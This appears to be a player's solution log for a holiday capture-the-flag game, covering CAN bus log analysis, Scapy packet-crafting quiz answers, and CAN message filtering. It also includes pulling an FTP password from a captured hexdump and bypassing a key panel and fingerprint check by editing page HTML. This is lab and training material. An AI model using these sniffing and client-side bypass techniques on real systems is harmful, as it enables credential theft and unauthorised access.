                (1608926676.651814) vcan0 244#00000006A5
                (1608926676.664472) vcan0 244#0000000693
                (1608926676.676432) vcan0 244#0000000681
                (1608926676.689024) vcan0 244#000000066F
                (1608926676.701590) vcan0 244#000000065D
                (1608926676.714327) vcan0 244#000000064B
                (1608926676.727458) vcan0 244#0000000639
                (1608926676.740472) vcan0 244#0000000627
                (1608926676.753463) vcan0 244#0000000615
                (1608926676.765248) vcan0 244#0000000602
                (1608926676.778259) vcan0 244#00000005F0
                (1608926676.790657) vcan0 244#00000005DE
                (1608926676.803581) vcan0 244#00000005CC
                (1608926676.815887) vcan0 244#00000005BA
                (1608926676.827905) vcan0 244#00000005A8
                (1608926676.839893) vcan0 244#0000000596
                (1608926676.852918) vcan0 244#0000000584
                (1608926676.865137) vcan0 244#0000000572
                (1608926676.878200) vcan0 244#000000055F
                (1608926676.889896) vcan0 244#000000054D
                (1608926676.902756) vcan0 244#000000053B
                (1608926676.914381) vcan0 244#0000000529
                (1608926676.928678) vcan0 244#0000000517
                (1608926676.943733) vcan0 244#0000000505
                (1608926676.955255) vcan0 244#00000004F3
                (1608926676.967979) vcan0 244#00000004E1
                (1608926676.980286) vcan0 244#00000004CF
                (1608926676.992816) vcan0 244#00000004BD
                (1608926677.005791) vcan0 244#00000004AA
                (1608926677.023898) vcan0 244#0000000498
                (1608926677.038187) vcan0 244#0000000486
                (1608926677.053019) vcan0 244#0000000474
                (1608926677.064917) vcan0 244#0000000462
                (1608926677.077444) vcan0 244#0000000450
                (1608926677.090974) vcan0 244#000000043E
                (1608926677.108963) vcan0 244#000000042C
                (1608926677.121427) vcan0 244#000000041A
                (1608926677.121567) vcan0 188#00000000
                (1608926677.133434) vcan0 244#0000000407
                (1608926677.149505) vcan0 244#00000003F5
                (1608926677.164389) vcan0 244#00000003E3
                (1608926677.178859) vcan0 244#00000003D1
                (1608926677.191955) vcan0 244#00000003BF
                (1608926677.204090) vcan0 244#00000003AD
                (1608926677.217614) vcan0 244#000000039B
                (1608926677.229959) vcan0 244#0000000389
                (1608926677.243887) vcan0 244#0000000377
                (1608926677.256201) vcan0 244#0000000365
                (1608926677.268317) vcan0 244#0000000352
                (1608926677.281194) vcan0 244#0000000340
                (1608926677.294173) vcan0 244#000000032E
                (1608926677.307943) vcan0 244#000000031C
                (1608926677.320593) vcan0 244#000000030A
                (1608926677.338126) vcan0 244#00000002F8
                (1608926677.351183) vcan0 244#00000002E6
                (1608926677.361908) vcan0 244#00000002D4
                (1608926677.374783) vcan0 244#00000002C2
                (1608926677.388392) vcan0 244#00000002AF
                (1608926677.401141) vcan0 244#000000029D
                (1608926677.414678) vcan0 244#000000028B
                (1608926677.426787) vcan0 244#0000000279
                (1608926677.439069) vcan0 244#0000000267
                (1608926677.451587) vcan0 244#0000000255
                (1608926677.465164) vcan0 244#0000000243
                (1608926677.478667) vcan0 244#0000000231
                (1608926677.496258) vcan0 244#000000021F
                (1608926677.508874) vcan0 244#000000020D
                (1608926677.521829) vcan0 244#00000001FA
                (1608926677.536436) vcan0 244#00000001E8
                (1608926677.549753) vcan0 244#00000001D6
                (1608926677.562240) vcan0 244#00000001C4
                (1608926677.574655) vcan0 244#00000001B2
                (1608926677.588231) vcan0 244#00000001A0
                (1608926677.601910) vcan0 244#000000018E
                (1608926677.616497) vcan0 244#000000017C
                (1608926677.630431) vcan0 244#000000016A
                (1608926677.630561) vcan0 188#00000000
                (1608926677.642861) vcan0 244#0000000157
                (1608926677.656056) vcan0 244#0000000145
                (1608926677.668476) vcan0 244#0000000133
                (1608926677.681134) vcan0 244#0000000121
                (1608926677.693826) vcan0 244#000000010F
                (1608926677.706551) vcan0 244#00000000FD
                (1608926677.719336) vcan0 244#00000000EB
                (1608926677.732079) vcan0 244#00000000D9
                (1608926677.744946) vcan0 244#00000000C7
                (1608926677.760570) vcan0 244#00000000B5
                (1608926677.775364) vcan0 244#00000000A2
                (1608926677.789743) vcan0 244#0000000124
                (1608926677.803111) vcan0 244#0000000119
                (1608926677.816107) vcan0 244#000000014C
                (1608926677.830753) vcan0 244#0000000110
                (1608926677.842352) vcan0 244#00000001AB
                (1608926677.856006) vcan0 244#0000000140
                (1608926677.869584) vcan0 244#0000000167
                (1608926677.881474) vcan0 244#000000012F
                (1608926677.894614) vcan0 244#00000001EA
                (1608926677.908144) vcan0 244#00000001EB
                (1608926677.921136) vcan0 244#00000001A6
                (1608926677.937236) vcan0 244#00000001D2
                (1608926677.950545) vcan0 244#0000000155
                (1608926677.962782) vcan0 244#0000000116
                (1608926677.976140) vcan0 244#000000019F
                (1608926677.990530) vcan0 244#000000018F
                (1608926678.008073) vcan0 244#000000015C
                (1608926678.021262) vcan0 244#000000013E
                (1608926678.033429) vcan0 244#00000001AD
                (1608926678.046909) vcan0 244#0000000151
                (1608926678.060111) vcan0 244#0000000104
                (1608926678.071985) vcan0 244#00000001F2
                (1608926678.083847) vcan0 244#000000014E
                (1608926678.096437) vcan0 244#00000001C8
                (1608926678.107851) vcan0 244#000000012C
                (1608926678.121666) vcan0 244#00000001B4
                (1608926678.133549) vcan0 244#0000000156
                (1608926678.141434) vcan0 188#00000000
                (1608926678.148586) vcan0 244#000000019E
                (1608926678.162507) vcan0 244#000000016B
                (1608926678.177133) vcan0 244#0000000189
                (1608926678.190641) vcan0 244#000000019D
                (1608926678.202156) vcan0 244#00000001AB
                (1608926678.214529) vcan0 244#000000013E
                (1608926678.226125) vcan0 244#0000000186
                (1608926678.237962) vcan0 244#0000000158
                (1608926678.251533) vcan0 244#0000000186
                (1608926678.264476) vcan0 244#00000001E2
                (1608926678.278343) vcan0 244#00000001DB
                (1608926678.291776) vcan0 244#00000001D2
                (1608926678.304371) vcan0 244#00000001E8
                (1608926678.316318) vcan0 244#0000000162
                (1608926678.328870) vcan0 244#0000000114
                (1608926678.341845) vcan0 244#0000000156
                (1608926678.355350) vcan0 244#00000001D4
                (1608926678.368556) vcan0 244#0000000146
                (1608926678.380654) vcan0 244#0000000192
                (1608926678.394633) vcan0 244#000000017F
                (1608926678.409006) vcan0 244#0000000140
                (1608926678.423402) vcan0 244#00000001ED
                (1608926678.437327) vcan0 244#0000000147
                (1608926678.451283) vcan0 244#00000001AE
                (1608926678.464014) vcan0 244#000000018E
                (1608926678.476738) vcan0 244#00000001D6
                (1608926678.489315) vcan0 244#0000000199
                (1608926678.502639) vcan0 244#0000000173
                (1608926678.515574) vcan0 244#000000011E
                (1608926678.528405) vcan0 244#000000016A
                (1608926678.541244) vcan0 244#00000001E5
                (1608926678.553858) vcan0 244#0000000159
                (1608926678.566661) vcan0 244#0000000171
                (1608926678.580414) vcan0 244#000000010A
                (1608926678.592863) vcan0 244#0000000193
                (1608926678.604843) vcan0 244#0000000138
                (1608926678.616971) vcan0 244#0000000166
                (1608926678.629068) vcan0 244#0000000135

            
2020-12-31 18:17:29.226 +00:00 [INF] 19B# is LOCK/UNLOCK

                (1608926664.626448) vcan0 19B#000000000000      LOCK
                (1608926671.122520) vcan0 19B#00000F000000      UNLOCK
                (1608926674.092148) vcan0 19B#000000000000      LOCK

            
2020-12-31 18:17:29.228 +00:00 [INF] elf@58bf86f1423e:~$ ./runtoanswer
                
                There are two LOCK codes and one UNLOCK code in the log.  What is the decimal portion of the UNLOCK timestamp?
                (e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456.
                > 122520

                Your answer: 122520
                Checking....
                Your answer is correct!

            
2020-12-31 18:17:29.255 +00:00 [VRB] Challenge CANBusInvestigation completed
2020-12-31 18:17:29.262 +00:00 [VRB] Running challange ScapyPrepper
2020-12-31 18:17:29.270 +00:00 [INF] yes

                Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing pr
                esent packets for shipment.
                Start by running the task.submit() function passing in a string argument of 'start'.
                Type task.help() for help on this question.

            
2020-12-31 18:17:29.290 +00:00 [INF] task.submit('start')

                Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing pr
                esent packets for shipment.
                Start by running the task.submit() function passing in a string argument of 'start'.
                Type task.help() for help on this question.

                Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted()

            
2020-12-31 18:17:29.298 +00:00 [INF] task.submit(send)

                Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
                
                Correct! The "send" scapy class will send a crafted scapy packet out of a network interface.

            
2020-12-31 18:17:29.326 +00:00 [INF] task.submit(sniff)

                Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.
                
                Correct! the "sniff" scapy class will sniff network traffic and return these packets in a list.

            
2020-12-31 18:17:29.327 +00:00 [INF] task.submit(1)

                Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
                1.pkt = sr1(IP(dst = "127.0.0.1") / TCP(dport = 20))
                2.pkt = sniff(IP(dst = "127.0.0.1") / TCP(dport = 20))
                3.pkt = sendp(IP(dst = "127.0.0.1") / TCP(dport = 20))

                Correct! sr1 will send a packet, then immediately sniff for a response packet.

            
2020-12-31 18:17:29.330 +00:00 [INF] task.submit(rdpcap)

                Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.

                Correct! the "rdpcap" scapy class can read pcap files.

            
2020-12-31 18:17:29.359 +00:00 [INF] task.submit(2)

                The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices 
                below that correctly prints a summary of UDP_PACKETS:

                1. UDP_PACKETS.print()
                2. UDP_PACKETS.show()
                3. UDP_PACKETS.list()

                Correct! .show() can be used on lists of packets AND on an individual packet.

            
2020-12-31 18:17:29.361 +00:00 [INF] task.submit(UDP_PACKETS[0])

                Submit only the first packet found in UDP_PACKETS.

                >>> UDP_PACKETS.show()
                0000 Ether / IP / UDP / DNS Qry "b'www.elves.rule.'"
                0001 Ether / IP / UDP / DNS Ans "10.21.23.12"

                Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0.

            
2020-12-31 18:17:29.397 +00:00 [INF] task.submit(TCP_PACKETS[1][TCP])

                Submit only the entire TCP layer of the second packet in TCP_PACKETS

                Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP]

            
2020-12-31 18:17:29.426 +00:00 [INF] 
                UDP_PACKETS[0][IP].src="127.0.0.1"
                task.submit(UDP_PACKETS[0])
            

                Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet                

                Correct! You can change ALL scapy packet attributes using this method.

            
2020-12-31 18:17:29.429 +00:00 [INF] task.submit('echo')

                Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.
                
                >>> TCP_PACKETS.hexdump()

                0000 17:24:40.499548 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp S
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 30 A7 E3 40 00 80 06 D0 60 C0 A8 00 72 C0 A8  .0..@....`...r..
                0020  00 C1 04 71 00 15 DF B3 B2 FE 00 00 00 00 70 02  ...q..........p.
                0030  40 00 29 63 00 00 02 04 05 B4 01 01 04 02        @.)c..........
                0001 17:24:40.501867 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 SA
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 30 29 60 00 00 80 06 8E E4 C0 A8 00 C1 C0 A8  .0)`............
                0020  00 72 00 15 04 71 C6 C7 01 41 DF B3 B2 FF 70 12  .r...q...A....p.
                0030  40 00 61 51 00 00 02 04 05 AC 01 01 04 02        @.aQ..........
                0002 17:24:40.501886 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp A
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 28 A7 E4 40 00 80 06 D0 67 C0 A8 00 72 C0 A8  .(..@....g...r..
                0020  00 C1 04 71 00 15 DF B3 B2 FF C6 C7 01 42 50 10  ...q.........BP.
                0030  44 10 89 FD 00 00                                D.....
                0003 17:24:40.503947 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 46 29 61 40 00 80 06 4E CD C0 A8 00 C1 C0 A8  .F)a@...N.......
                0020  00 72 00 15 04 71 C6 C7 01 42 DF B3 B2 FF 50 18  .r...q...B....P.
                0030  FF FF D9 7D 00 00 32 32 30 20 4E 6F 72 74 68 20  ...}..220 North 
                0040  50 6F 6C 65 20 46 54 50 20 53 65 72 76 65 72 0D  Pole FTP Server.
                0050  0A                                               .
                0004 17:24:40.504807 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 37 A7 E5 40 00 80 06 D0 57 C0 A8 00 72 C0 A8  .7..@....W...r..
                0020  00 C1 04 71 00 15 DF B3 B2 FF C6 C7 01 60 50 18  ...q.........`P.
                0030  43 F2 0A 98 00 00 55 53 45 52 20 61 6C 61 62 61  C.....USER alaba
                0040  73 74 65 72 0D                                   ster.
                0005 17:24:40.506108 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 4D 29 62 40 00 80 06 4E C5 C0 A8 00 C1 C0 A8  .M)b@...N.......
                0020  00 72 00 15 04 71 C6 C7 01 60 DF B3 B3 0E 50 18  .r...q...`....P.
                0030  FF F0 3D 9C 00 00 33 33 31 20 50 61 73 73 77 6F  ..=...331 Passwo
                0040  72 64 20 72 65 71 75 69 72 65 64 20 66 6F 72 20  rd required for 
                0050  61 6C 61 62 61 73 74 65 72 2E 0D                 alabaster..
                0006 17:24:40.507195 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 33 A7 E6 40 00 80 06 D0 5A C0 A8 00 72 C0 A8  .3..@....Z...r..
                0020  00 C1 04 71 00 15 DF B3 B3 0E C6 C7 01 85 50 18  ...q..........P.
                0030  43 CD E9 6B 00 00 50 41 53 53 20 65 63 68 6F 0D  C..k..PASS echo.
                0040  0A                                               .
                0007 17:24:40.509484 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 46 29 63 40 00 80 06 4E CB C0 A8 00 C1 C0 A8  .F)c@...N.......
                0020  00 72 00 15 04 71 C6 C7 01 85 DF B3 B3 19 50 18  .r...q........P.
                0030  FF E5 00 D3 00 00 32 33 30 20 55 73 65 72 20 61  ......230 User a
                0040  6C 61 62 61 73 74 65 72 20 6C 6F 67 67 65 64 20  labaster logged 
                0050  69 6E 2E 0D                                      in..

                >>> TCP_PACKETS[6][Raw]
                <Raw  load='PASS echo\r\n' |>


                Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:
                [pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]


            
2020-12-31 18:17:29.498 +00:00 [INF] task.submit(ICMP_PACKETS[1][ICMP].chksum)

                The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. 
                Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.

                >>> ICMP_PACKETS
                <No name: TCP:0 UDP:0 ICMP:4 Other:0>

                >>> ICMP_PACKETS.show()
                0000 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw
                0001 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw
                0002 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw
                0003 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw

                >>> ICMP_PACKETS[1]
                <Ether  dst=00:0c:29:d0:96:b3 src=00:50:56:f9:54:66 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=84 id=2585 flags= frag=0 ttl=128 proto=icmp chksum=0xe69b src=10.21.23.12 dst=10.21.23.12 |<ICMP  type=echo-reply code=0 chksum=0x4c44 id=0x6d38 seq=0x1 unused='' |<Raw  load='L=\xa7^\x00\x00\x00\x00\x88\x13\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567' |>>>>

                Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .

            
2020-12-31 18:17:29.532 +00:00 [INF] task.submit(3)

                Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"

                1.pkt = Ether(src = '127.0.0.1') / ICMP(type = "echo-request")
                2.pkt = IP(src = '127.0.0.1') / ICMP(type = "echo-reply")
                3.pkt = IP(dst = '127.0.0.1') / ICMP(type = "echo-request")

                Correct! Once you assign the packet to a variable named "pkt" you can then use that variable to send or manipulate your created packet.

            
2020-12-31 18:17:29.535 +00:00 [INF] task.submit(IP(dst="127.127.127.127")/UDP(dport=5000))

                Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)

                >>> pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
                >>> task.submit(pkt)

                Correct! Your UDP packet creation should look something like this:
                pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
                task.submit(pkt)

            
2020-12-31 18:17:29.569 +00:00 [INF] task.submit(IP(dst="127.2.3.4")/UDP(dport=53)/DNS(qd=DNSQR(qname="elveslove.santa")))

                Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query 
                with a qname of "elveslove.santa". (all other packet attributes can be unspecified)

                Correct! Your UDP packet creation should look something like this:
                pkt = IP(dst="127.2.3.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="elveslove.santa"))
                task.submit(pkt)

            
2020-12-31 18:17:29.571 +00:00 [INF] 
                ARP_PACKETS[1][ARP].op='is-at'                
                ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba'
                ARP_PACKETS[1][ARP].hwdst='00:16:ce:6e:8b:24'task.submit(ARP_PACKETS)
            

                The variable ARP_PACKETS contains an ARP request and response packets. 
                The ARP response (the second packet) has 3 incorrect fields in the ARP layer. 
                Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

                >>> task.submit(ARP_PACKETS)
                Incorrect!
                The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. 
                Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

                The three fields in ARP_PACKETS[1][ARP] that are incorrect are op, hwsrc, and hwdst. 
                A sample ARP pcap can be referenced at https://www.cloudshark.org/captures/e4d6ea732135. 
                You can run the "reset_arp()" function to reset the ARP packets back to their original form.

                >>> ARP_PACKETS[1][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>

                >>> reset_arp()

                >>> ARP_PACKETS[1][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>

                >>> ARP_PACKETS.hexdump()
                0000 19:59:22.880651 Ether / ARP who has 192.168.0.1 says 192.168.0.114
                0000  FF FF FF FF FF FF 00 16 CE 6E 8B 24 08 06 00 01  .........n.$....
                0010  08 00 06 04 00 01 00 16 CE 6E 8B 24 C0 A8 00 72  .........n.$...r
                0020  00 00 00 00 00 00 C0 A8 00 01                    ..........
                0001 19:59:22.884732 Ether / ARP None 192.168.0.1 > 192.168.0.114 / Padding
                0000  00 16 CE 6E 8B 24 00 13 46 0B 22 BA 08 06 00 01  ...n.$..F.......
                0010  08 00 06 04 00 00 FF FF FF FF FF FF C0 A8 00 01  ................
                0020  FF FF FF FF FF FF C0 A8 00 72 C0 A8 00 72        .........r...r


                >>> ARP_PACKETS[0][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=00:16:ce:6e:8b:24 psrc=192.168.0.114 hwdst=00:00:00:00:00:00 pdst=192.168.0.1 |>

                >>> ARP_PACKETS[1][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>

              
                >>> ARP_PACKETS[1]
                <Ether  dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=01:16:ce:6e:8b:24 psrc=192.168.0.1 hwdst=00:16:ce:6e:8b:24 pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>>

                >>> ARP_PACKETS[1][ARP].op='is-at'
                >>> ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba'
                >>> ARP_PACKETS[1][ARP].hwdst='00:16:ce:6e:8b:24'


                Great, you prepared all the present packets!

                Congratulations, all pretty present packets properly prepared for processing!

            
2020-12-31 18:17:29.633 +00:00 [VRB] Challenge ScapyPrepper completed
2020-12-31 18:17:29.637 +00:00 [VRB] Running challange SleighCANDBUS
2020-12-31 18:17:29.640 +00:00 [INF] document.getElementById("can-feed").innerText
               
                Epoch Time    ID  MESSAGE
                1609182521803 244#0000000000
                1609182521903 080#000000
                1609182522005 019#00000000
                1609182522106 188#00000000
                1609182522207 244#0000000000
                1609182522308 080#000000
                1609182522410 019#00000000
                1609182522511 188#00000000
                1609182522612 244#0000000000
                1609182522716 19B#0000000F2057
                1609182522814 080#000000
                1609182522915 019#00000000
                1609182523017 188#00000000
                1609182523117 244#0000000000
                1609182523217 080#000000
                1609182523319 019#00000000
                1609182523420 188#00000000
                1609182523522 244#0000000000
                1609182523623 080#000000
                1609182523724 019#00000000


                1609182626770 19B#0000000F2057
                1609182626870 080#000000
                1609182626973 019#00000000
                1609182627076 188#00000000
                1609182627177 244#0000000000
                1609182627278 080#000000
                1609182627379 019#00000000
                1609182627480 188#00000000
                1609182627582 244#0000000000
                1609182627685 19B#0000000F2057
                1609182627783 080#000000
                1609182627889 019#00000000
                1609182627986 188#00000000
                1609182628087 244#0000000000
                1609182628188 080#000000
                1609182628291 019#00000000
                1609182628393 188#00000000
                1609182628494 244#0000000000
                1609182628595 080#000000
                1609182628697 019#00000000


                Steering 019


                1609182811389 019#FFFFFFCF
                1609182811493 188#00000000
                1609182811591 244#00000003ea
                1609182811693 080#000000
                1609182811794 019#FFFFFFD0
                1609182811895 188#00000000
                1609182811996 244#00000003eb
                1609182812098 080#000000
                1609182812198 019#FFFFFFCE
                1609182812299 188#00000000
                1609182812401 244#00000003ed
                1609182812502 080#000000
                1609182812603 019#FFFFFFCD
                1609182812704 188#00000000
                1609182812805 244#00000003e0
                1609182812906 080#000000
                1609182813008 019#FFFFFFCD
                1609182813109 188#00000000
                1609182813211 244#00000003ec
                1609182813312 080#000000

            
2020-12-31 18:17:29.680 +00:00 [INF] First blood.... didn't work, so started disabling

                Exclude

                19B Equals  0000000F2057
                019 Greater FFFFFFFFFF00
                080 Less    000000000000

                19B Equals  0000000F2057
                188 Equals  000000000000
                080 Equals  000000000000
                244 Equals  000000000000
                080 Less    000000000000

            
2020-12-31 18:17:29.757 +00:00 [INF] First exlude all to see what is wrong

                Exclude 
                244 Equals  000000000000
                080 Equals  000000000000
                188 Equals  000000000000
                019 Equals  000000000000


                Epoch Time    ID  MESSAGE
                1609185100048 19B#0000000F2057
                1609185100251 019#00000000
                1609185100655 019#00000000
                1609185101059 019#00000000
                1609185101464 019#00000000
                1609185104191 19B#0000000F2057
                1609185107522 19B#0000000F2057
                1609185122575 19B#0000000F2057
                1609185126715 19B#0000000F2057
                1609185133280 19B#0000000F2057
                1609185134998 19B#0000000F2057
                1609185140358 19B#0000000F2057
                1609185143286 19B#0000000F2057
                1609185145001 19B#0000000F2057
                1609185145912 19B#0000000F2057
                1609185159350 19B#0000000F2057
                1609185169147 19B#0000000F2057
                1609185173692 19B#0000000F2057
                1609185174600 19B#0000000F2057
                1609185180361 19B#0000000F2057                        


            
2020-12-31 18:17:29.843 +00:00 [INF] Exclude following messages to defrost Sleigh!


                Exlude negative values breaks 
                080 Less    000000000000    

                Exclude bad lock meessage                  
                19B Equals  0000000F2057    

                Exclude bad steering -51 and 50 values are outside steering values
                019 Equals FFFFFFFFFFD0 
                019 Equals 000000000033 

            
2020-12-31 18:17:29.846 +00:00 [VRB] Challenge SleighCANDBUS completed
2020-12-31 18:17:29.849 +00:00 [VRB] Running challange DefeatFingerprintSensor
2020-12-31 18:17:29.879 +00:00 [INF] Change data-floor value to get to 3rd floor if the button is not powered yet.

                <body class="marble portals nut2 nut candycane ball yellowlight elevator-key greenlight redlight workshop-button">
                    <div class="box-parent">
                      <canvas id="stage" class="juice" width="563" height="600"></canvas>
                      <div class="glow red" style="background-position: 0px -216px;"></div>
                      <div class="glow yellow" style="background-position: 0px 0px;"></div>
                      <div class="glow green" style="background-position: 0px -108px;"></div>
                      <div class="led red on"></div>
                      <div class="led yellow"></div>
                      <div class="led green on"></div>
                      <div class="print-indicator"></div>
                      <div class="help-overlay"></div>
                      <button class="reset-btn">Reset Configuration</button>
                      <button class="help-btn">Help</button>
                    <div class="item planet marble" data-type="planet" data-name="marble" style="left: 547px; top: 313px;"></div><div class="item light redlight" data-type="light" data-name="redlight" style="left: 253px; top: 40.5px;"></div><div class="item light yellowlight" data-type="light" data-name="yellowlight" style="left: 158px; top: 336.5px;"></div><div class="item light greenlight" data-type="light" data-name="greenlight" style="left: 448px; top: 47.5px;"></div><div class="item item nut" data-type="item" data-name="nut" style="left: 532px; top: 336px;"></div><div class="item item nut2" data-type="item" data-name="nut2" style="left: 342px; top: 76px;"></div><div class="item item ball" data-type="item" data-name="ball" style="left: 516.5px; top: 285.5px;"></div><div class="item item candycane" data-type="item" data-name="candycane" style="left: 571px; top: 514px;"></div><div class="item portal red" data-type="portal" data-name="red" style="left: 466px; top: 152px;"></div><div class="item portal blue" data-type="portal" data-name="blue" style="left: 453px; top: 220px;"></div></div>
                    <div class="cover">
      
                      <img class="f15btn found" src="images/floor1-5button.png">
                      <div class="key"></div>
                      <div class="localstorage-error"><strong>Heads up:</strong> Your Santavator repair configuration cannot be accessed or saved in incognito mode.</div><div class="print-cover"></div>
                      <button class="btn btn1 powered" data-floor="1">1</button>
                      <button class="btn btn15 powered" data-floor="1.5">1.5</button>`
                      <button class="btn btn2 powered" data-floor="2">2</button>
                      <button class="btn btn3 active" data-floor="3">3</button>
                      <button class="btn btnr powered" data-floor="r">R</button>
                    </div>
                  <script src="app.js"></script>
                </body>
            
2020-12-31 18:17:29.927 +00:00 [VRB] Challenge DefeatFingerprintSensor completed
2020-12-31 18:17:29.959 +00:00 [VRB] Running challange OperateTheSantavator
2020-12-31 18:17:29.960 +00:00 [INF] Access panel without key... Hide the cover html element


                <div class="cover">
                    <div class="localstorage-error"><strong>Heads up:</strong> Your Santavator repair configuration cannot be accessed or saved in incognito mode.</div>
                    <img class="f15btn found" src="images/floor1-5button.png">
                    <div class="key"></div>
                    <div class="print-cover"></div>
                    <button class="btn btn1 active powered" data-floor="1">1</button>
                    <button class="btn btn15" data-floor="1.5">1.5</button>`
                    <button class="btn btn2 powered" data-floor="2">2</button>
                    <button class="btn btn3" data-floor="3">3</button>
                    <button class="btn btnr" data-floor="r">R</button>
                </div>

            
2020-12-31 18:17:30.040 +00:00 [VRB] Challenge OperateTheSantavator completed
2020-12-31 18:17:30.064 +00:00 [VRB] Running challange UncoverChristmasList
2020-12-31 18:17:30.077 +00:00 [INF] Open https://www.photopea.com/ and use Twirl option.
2020-12-31 18:17:30.084 +00:00 [VRB] Challenge UncoverChristmasList completed
